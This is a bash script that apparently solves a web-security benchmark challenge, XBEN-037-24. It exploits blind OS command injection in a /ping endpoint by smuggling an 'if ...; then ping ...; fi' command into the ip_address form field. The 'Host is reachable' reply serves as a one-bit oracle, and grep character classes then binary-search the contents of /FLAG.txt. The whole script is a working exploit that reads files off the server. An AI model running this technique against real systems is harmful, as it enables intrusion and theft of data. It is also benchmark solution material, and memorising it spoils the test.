#!/usr/bin/env bash
# XBEN-037-24 — blind OS command injection, exfiltrated by grep character
# classes. Proxy-mode twin. /ping runs the ip_address field through a shell; an
# injected `if ...; then ping ...; fi` turns "Host is reachable" into a one-bit
# oracle. The flag is 64 hex chars, binary-searched 4 requests per character.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
FILE="${2:-/FLAG.txt}"
SESSION="xben037p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"

ask() {   # yes if the injected command ran (the ping made the host reachable)
  local out
  out="$("$H5I" websec replay "$BASE" --create --reset-budget --session "$SESSION" \
      --set 'method=POST' --set 'path=/ping' \
      --set "form.ip_address=;if $1;then ping -c 1 127.0.0.1;fi;#" 2>/dev/null)"
  grep -q 'Host is reachable' <<<"$out"
}

ask "true" || { echo "oracle does not answer: no injection" >&2; exit 1; }

ALPHABET='0123456789abcdef'
flag='FLAG{'
for position in $(seq 6 69); do        # cut -c is 1-based; 'FLAG{' is 5 chars
  low=0; high=15
  while [ "$low" -lt "$high" ]; do
    middle=$(((low+high)/2))
    class="${ALPHABET:low:middle-low+1}"
    if ask "cut -c$position-$position $FILE | grep -q '[$class]'"; then high=$middle; else low=$((middle+1)); fi
  done
  flag="$flag${ALPHABET:low:1}"
done
echo "$flag}"
